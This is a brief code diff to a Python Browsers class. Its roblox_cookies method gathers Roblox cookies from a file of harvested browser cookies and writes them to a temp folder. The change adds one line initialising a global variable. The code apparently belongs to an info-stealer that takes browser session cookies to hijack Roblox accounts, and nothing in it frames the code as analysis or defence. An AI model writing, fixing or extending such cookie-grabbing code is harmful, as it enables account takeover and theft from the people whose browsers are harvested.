@@ -580,6 +580,7 @@ class Browsers:
 
     def roblox_cookies(self):
         global robo_cookie
+        robo_cookie = ""
         with open(os.path.join(tempfolder, "Roblox", "Roblox Cookies.txt"), 'w', encoding="utf-8") as f:
             f.write(f"{github} | Roblox Cookies\n\n")
             with open(os.path.join(tempfolder, "Browser", "Browser Cookies.txt"), 'r', encoding="utf-8") as f2:
